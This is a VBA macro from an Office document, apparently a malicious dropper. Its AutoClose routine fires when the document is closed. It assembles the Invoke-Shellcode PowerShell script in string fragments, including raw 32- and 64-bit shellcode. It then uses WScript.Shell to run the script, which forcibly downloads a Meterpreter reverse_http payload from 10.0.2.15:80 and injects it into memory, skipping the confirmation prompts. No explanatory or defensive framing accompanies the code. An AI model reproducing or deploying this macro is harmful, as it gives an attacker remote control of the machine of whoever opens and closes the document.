Sub AutoClose()
        rCG
End Sub

Public Function rCG() As Variant
        Dim x As String
        x = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        x = x + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        x = x + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        x = x + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        x = x + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        x = x + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        x = x + "    $Shellcode,
    [Parameter( ParameterSetName ="
        x = x + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        x = x + "reter/reverse_http',
                  'windows/me"
        x = x + "terpreter/reverse_https',
                  Ignore"
        x = x + "Case = $True )]
    [String]
    $Payload = 'windo"
        x = x + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        x = x + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        x = x + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        x = x + " = $True,
                ParameterSetName = 'Meta"
        x = x + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        x = x + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        x = x + "datory = $True,
                ParameterSetName ="
        x = x + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        x = x + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        x = x + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        x = x + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        x = x + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        x = x + "sion\Internet Settings').'User Agent',
    [Parame"
        x = x + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        x = x + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        x = x + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        x = x + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        x = x + "$False,
    [Switch]
    $Force = $False
)
    Set"
        x = x + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        x = x + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        x = x + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        x = x + "meters['Payload'].Attributes |
            Where-O"
        x = x + "bject {$_.TypeId -eq [System.Management.Automation"
        x = x + ".ValidateSetAttribute]}
        foreach ($Payload "
        x = x + "in $AvailablePayloads.ValidValues)
        {
     "
        x = x + "       New-Object PSObject -Property @{ Payloads ="
        x = x + " $Payload }
        }
        Return
    }
    if "
        x = x + "( $PSBoundParameters['ProcessID'] )
    {
        "
        x = x + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        x = x + "-Null
    }
    function Local:Get-DelegateType
  "
        x = x + "  {
        Param
        (
            [OutputTyp"
        x = x + "e([Type])]
            [Parameter( Position = 0)]
"
        x = x + "            [Type[]]
            $Parameters = (Ne"
        x = x + "w-Object Type[](0)),
            [Parameter( Posit"
        x = x + "ion = 1 )]
            [Type]
            $ReturnT"
        x = x + "ype = [Void]
        )
        $Domain = [AppDomai"
        x = x + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        x = x + "t System.Reflection.AssemblyName('ReflectedDelegat"
        x = x + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        x = x + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        x = x + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        x = x + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        x = x + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        x = x + "der.DefineType('MyDelegateType', 'Class, Public, S"
        x = x + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        x = x + "egate])
        $ConstructorBuilder = $TypeBuilder"
        x = x + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        x = x + "ic', [System.Reflection.CallingConventions]::Stand"
        x = x + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        x = x + "mplementationFlags('Runtime, Managed')
        $Me"
        x = x + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        x = x + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        x = x + ", $Parameters)
        $MethodBuilder.SetImplement"
        x = x + "ationFlags('Runtime, Managed')
        Write-Outpu"
        x = x + "t $TypeBuilder.CreateType()
    }
    function Loc"
        x = x + "al:Get-ProcAddress
    {
        Param
        (
 "
        x = x + "           [OutputType([IntPtr])]
            [Par"
        x = x + "ameter( Position = 0, Mandatory = $True )]
       "
        x = x + "     [String]
            $Module,
            [Pa"
        x = x + "rameter( Position = 1, Mandatory = $True )]
      "
        x = x + "      [String]
            $Procedure
        )
  "
        x = x + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        x = x + ".GetAssemblies() |
            Where-Object { $_.G"
        x = x + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        x = x + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        x = x + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        x = x + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        x = x + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        x = x + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        x = x + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        x = x + "eropServices.HandleRef], [String]))
        $Kern3"
        x = x + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        x = x + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        x = x + "ndleRef = New-Object System.Runtime.InteropService"
        x = x + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        x = x + "Output $GetProcAddress.Invoke($null, @([System.Run"
        x = x + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        x = x + "ure))
    }
    function Local:Emit-CallThreadStub"
        x = x + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        x = x + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        x = x + "chitecture / 8
        function Local:ConvertTo-Li"
        x = x + "ttleEndian ([IntPtr] $Address)
        {
         "
        x = x + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        x = x + "           $Address.ToString("X$($IntSizePtr*2)") "
        x = x + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        x = x + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        x = x + " } }
            [System.Array]::Reverse($LittleEn"
        x = x + "dianByteArray)
            Write-Output $LittleEnd"
        x = x + "ianByteArray
        }
        $CallStub = New-Obj"
        x = x + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        x = x + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        x = x + "                   # MOV   QWORD RAX, &shellcode
 "
        x = x + "           $CallStub += ConvertTo-LittleEndian $Ba"
        x = x + "seAddr       # &shellcode
            $CallStub +="
        x = x + " 0xFF,0xD0                              # CALL  RA"
        x = x + "X
            $CallStub += 0x6A,0x00              "
        x = x + "                # PUSH  BYTE 0
            $CallSt"
        x = x + "ub += 0x48,0xB8                              # MOV"
        x = x + "   QWORD RAX, &ExitThread
            $CallStub +="
        x = x + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        x = x + "ead
            $CallStub += 0xFF,0xD0            "
        x = x + "                  # CALL  RAX
        }
        el"
        x = x + "se
        {
            [Byte[]] $CallStub = 0xB8"
        x = x + "                           # MOV   DWORD EAX, &she"
        x = x + "llcode
            $CallStub += ConvertTo-LittleEn"
        x = x + "dian $BaseAddr       # &shellcode
            $Cal"
        x = x + "lStub += 0xFF,0xD0                              # "
        x = x + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        x = x + "                        # PUSH  BYTE 0
           "
        x = x + " $CallStub += 0xB8                                "
        x = x + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        x = x + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        x = x + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        x = x + "                          # CALL  EAX
        }
  "
        x = x + "      Write-Output $CallStub
    }
    function Lo"
        x = x + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        x = x + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        x = x + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        x = x + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        x = x + "        Throw "Unable to open a process handle for"
        x = x + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        x = x + "lse
        if ($64bitCPU) # Only perform theses c"
        x = x + "hecks if CPU is 64-bit
        {
            $IsWo"
        x = x + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        x = x + "-Null
            if ((!$IsWow64) -and $PowerShell"
        x = x + "32bit)
            {
                Throw 'Unable"
        x = x + " to inject 64-bit shellcode from within 32-bit Pow"
        x = x + "ershell. Use the 64-bit version of Powershell if y"
        x = x + "ou want this to work.'
            }
            e"
        x = x + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        x = x + "  {
                if ($Shellcode32.Length -eq 0)"
        x = x + "
                {
                    Throw 'No s"
        x = x + "hellcode was placed in the $Shellcode32 variable!'"
        x = x + "
                }
                $Shellcode = $S"
        x = x + "hellcode32
            }
            else # 64-bit"
        x = x + " process
            {
                if ($Shellc"
        x = x + "ode64.Length -eq 0)
                {
            "
        x = x + "        Throw 'No shellcode was placed in the $She"
        x = x + "llcode64 variable!'
                }
            "
        x = x + "    $Shellcode = $Shellcode64
            }
      "
        x = x + "  }
        else # 32-bit CPU
        {
          "
        x = x + "  if ($Shellcode32.Length -eq 0)
            {
   "
        x = x + "             Throw 'No shellcode was placed in the"
        x = x + " $Shellcode32 variable!'
            }
           "
        x = x + " $Shellcode = $Shellcode32
        }
        $Remo"
        x = x + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        x = x + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        x = x + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        x = x + ")
        {
            Throw "Unable to allocate "
        x = x + "shellcode memory in PID: $ProcessID"
        }
   "
        x = x + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        x = x + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        x = x + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        x = x + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        x = x + "      {
            $CallStub = Emit-CallThreadStu"
        x = x + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        x = x + "    else
        {
            $CallStub = Emit-Ca"
        x = x + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        x = x + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        x = x + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        x = x + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        x = x + "(!$RemoteStubAddr)
        {
            Throw "Un"
        x = x + "able to allocate thread call stub memory in PID: $"
        x = x + "ProcessID"
        }
        $WriteProcessMemory.I"
        x = x + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        x = x + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        x = x + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        x = x + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        x = x + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        x = x + "  {
            Throw "Unable to launch remote thr"
        x = x + "ead in PID: $ProcessID"
        }
        $CloseHa"
        x = x + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        x = x + "on Local:Inject-LocalShellcode
    {
        if ($"
        x = x + "PowerShell32bit) {
            if ($Shellcode32.Le"
        x = x + "ngth -eq 0)
            {
                Throw 'N"
        x = x + "o shellcode was placed in the $Shellcode32 variabl"
        x = x + "e!'
                return
            }
         "
        x = x + "   $Shellcode = $Shellcode32
        }
        els"
        x = x + "e
        {
            if ($Shellcode64.Length -e"
        x = x + "q 0)
            {
                Throw 'No shell"
        x = x + "code was placed in the $Shellcode64 variable!'
   "
        x = x + "             return
            }
            $She"
        x = x + "llcode = $Shellcode64
        }
        $BaseAddre"
        x = x + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        x = x + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        x = x + "X)
        if (!$BaseAddress)
        {
          "
        x = x + "  Throw "Unable to allocate shellcode memory in PI"
        x = x + "D: $ProcessID"
        }
        [System.Runtime.I"
        x = x + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        x = x + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        x = x + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        x = x + "  if ($PowerShell32bit)
        {
            $Cal"
        x = x + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        x = x + "adAddr 32
        }
        else
        {
       "
        x = x + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        x = x + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        x = x + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        x = x + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        x = x + "X)
        if (!$CallStubAddress)
        {
      "
        x = x + "      Throw "Unable to allocate thread call stub.""
        x = x + "
        }
        [System.Runtime.InteropServices"
        x = x + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        x = x + "allStub.Length)
        $ThreadHandle = $CreateThr"
        x = x + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        x = x + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        x = x + "dHandle)
        {
            Throw "Unable to la"
        x = x + "unch thread."
        }
        $WaitForSingleObje"
        x = x + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        x = x + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        x = x + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        x = x + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        x = x + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        x = x + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        x = x + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        x = x + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        x = x + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        x = x + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        x = x + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        x = x + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        x = x + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        x = x + "  else
    {
        $64bitCPU = $false
    }
    "
        x = x + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        x = x + "l32bit = $true
    }
    else
    {
        $Power"
        x = x + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        x = x + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        x = x + "owerShell32bit) {
            $RootInvocation = $M"
        x = x + "yInvocation.Line
            $Response = $True
   "
        x = x + "         if ( $Force -or ( $Response = $psCmdlet.S"
        x = x + "houldContinue( "Do you want to launch the payload "
        x = x + "from x86 Powershell?",
                   "Attempt"
        x = x + " to execute 32-bit shellcode from 64-bit Powershel"
        x = x + "l. Note: This process takes about one minute. Be p"
        x = x + "atient! You will also see some artifacts of the sc"
        x = x + "ript loading in the other process." ) ) ) { }
    "
        x = x + "        if ( !$Response )
            {
          "
        x = x + "      Return
            }
            if ($MyInvo"
        x = x + "cation.BoundParameters['Force'])
            {
   "
        x = x + "             $Command = "function $($MyInvocation."
        x = x + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        x = x + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        x = x + "   }
            else
            {
              "
        x = x + "  $Command = "function $($MyInvocation.InvocationN"
        x = x + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        x = x + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        x = x + "
            $CommandBytes = [System.Text.Encoding"
        x = x + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        x = x + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        x = x + "           $Execute = '$Command' + " | $Env:windir"
        x = x + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        x = x + "oProfile -Command -"
            Invoke-Expression"
        x = x + " -Command $Execute | Out-Null
            Return
 "
        x = x + "       }
        $Response = $True
        if ( $F"
        x = x + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        x = x + "Do you know what you're doing?",
               "A"
        x = x + "bout to download Metasploit payload '$($Payload)' "
        x = x + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        x = x + "  if ( !$Response )
        {
            Return
 "
        x = x + "       }
        switch ($Payload)
        {
     "
        x = x + "       'windows/meterpreter/reverse_http'
        "
        x = x + "    {
                $SSL = ''
            }
    "
        x = x + "        'windows/meterpreter/reverse_https'
      "
        x = x + "      {
                $SSL = 's'
               "
        x = x + " [System.Net.ServicePointManager]::ServerCertifica"
        x = x + "teValidationCallback = {$True}
            }
     "
        x = x + "   }
        if ($Legacy)
        {
            $R"
        x = x + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        x = x + "
        } else {
            $CharArray = 48..57 "
        x = x + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        x = x + "         $SumTest = $False
            while ($Sum"
        x = x + "Test -eq $False)
            {
                $Ge"
        x = x + "neratedUri = $CharArray | Get-Random -Count 4
    "
        x = x + "            $SumTest = (([int[]] $GeneratedUri | M"
        x = x + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        x = x + "  }
            $RequestUri = -join $GeneratedUri
"
        x = x + "            $Request = "http$($SSL)://$($Lhost):$("
        x = x + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        x = x + "ew-Object Uri($Request)
        $WebClient = New-O"
        x = x + "bject System.Net.WebClient
        $WebClient.Head"
        x = x + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        x = x + "roxy)
        {
            $WebProxyObject = New-"
        x = x + "Object System.Net.WebProxy
            $ProxyAddre"
        x = x + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        x = x + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        x = x + "oxyServer
            if ($ProxyAddress)
         "
        x = x + "   {
                $WebProxyObject.Address = $Pr"
        x = x + "oxyAddress
                $WebProxyObject.UseDefa"
        x = x + "ultCredentials = $True
                $WebClientO"
        x = x + "bject.Proxy = $WebProxyObject
            }
      "
        x = x + "  }
        try
        {
            [Byte[]] $Sh"
        x = x + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        x = x + "}
        catch
        {
            Throw "$($Er"
        x = x + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        x = x + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        x = x + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        x = x + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        x = x + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        x = x + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        x = x + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        x = x + "                             0x52,0x0c,0x8b,0x52,0"
        x = x + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        x = x + "x31,0xc0,
                                  0xac,0"
        x = x + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        x = x + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        x = x + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        x = x + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        x = x + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        x = x + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        x = x + "x8b,
                                  0x01,0xd6,0"
        x = x + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        x = x + "x38,0xe0,0x75,0xf4,
                              "
        x = x + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        x = x + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        x = x + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        x = x + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        x = x + "                                  0x5b,0x5b,0x61,0"
        x = x + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        x = x + "xeb,0x86,0x5d,
                                  0"
        x = x + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        x = x + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        x = x + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        x = x + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        x = x + "                             0x80,0xfb,0xe0,0x75,0"
        x = x + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        x = x + "xd5,0x63,
                                  0x61,0"
        x = x + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        x = x + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        x = x + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        x = x + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        x = x + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        x = x + "                             0x20,0x48,0x8b,0x72,0"
        x = x + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        x = x + "x31,0xc0,
                                  0xac,0"
        x = x + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        x = x + "x41,0x01,0xc1,0xe2,0xed,
                         "
        x = x + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        x = x + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        x = x + "                        0x00,0x00,0x00,0x48,0x85,0"
        x = x + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        x = x + "x44,
                                  0x8b,0x40,0"
        x = x + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        x = x + "x8b,0x34,0x88,0x48,
                              "
        x = x + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        x = x + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        x = x + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        x = x + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        x = x + "                                  0x8b,0x40,0x24,0"
        x = x + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        x = x + "x40,0x1c,0x49,
                                  0"
        x = x + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        x = x + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        x = x + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        x = x + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        x = x + "                             0x59,0x5a,0x48,0x8b,0"
        x = x + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        x = x + "x00,0x00,
                                  0x00,0"
        x = x + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        x = x + "x00,0x41,0xba,0x31,0x8b,
                         "
        x = x + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        x = x + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        x = x + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        x = x + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        x = x + "x47,
                                  0x13,0x72,0"
        x = x + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        x = x + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        x = x + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        x = x + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        x = x + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        x = x + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        x = x + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        x = x + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        x = x + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        x = x + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        x = x + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        x = x + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        x = x + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        x = x + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        x = x + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        x = x + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        x = x + "ernel32.dll WriteProcessMemory
        $WriteProce"
        x = x + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        x = x + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        x = x + "()) ([Bool])
        $WriteProcessMemory = [System"
        x = x + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        x = x + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        x = x + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        x = x + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        x = x + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        x = x + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        x = x + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        x = x + "eateRemoteThread = [System.Runtime.InteropServices"
        x = x + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        x = x + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        x = x + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        x = x + " CloseHandle
        $CloseHandleDelegate = Get-De"
        x = x + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        x = x + "le = [System.Runtime.InteropServices.Marshal]::Get"
        x = x + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        x = x + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        x = x + ".ShouldContinue( 'Do you wish to carry out your ev"
        x = x + "il plans?',
                 "Injecting shellcode "
        x = x + "injecting into $((Get-Process -Id $ProcessId).Proc"
        x = x + "essName) ($ProcessId)!" ) )
        {
            "
        x = x + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        x = x + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        x = x + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        x = x + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        x = x + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        x = x + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        x = x + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        x = x + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        x = x + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        x = x + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        x = x + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        x = x + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        x = x + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        x = x + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        x = x + "rocAddress kernel32.dll CreateThread
        $Crea"
        x = x + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        x = x + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        x = x + "IntPtr])
        $CreateThread = [System.Runtime.I"
        x = x + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        x = x + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        x = x + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        x = x + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        x = x + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        x = x + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        x = x + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        x = x + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        x = x + "ForSingleObjectDelegate)
        if ( $Force -or $"
        x = x + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        x = x + " your evil plans?',
                 "Injecting sh"
        x = x + "ellcode into the running PowerShell process!" ) )
"
        x = x + "        {
            Inject-LocalShellcode
      "
        x = x + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        x = x + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        x = x + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(x)
End Function
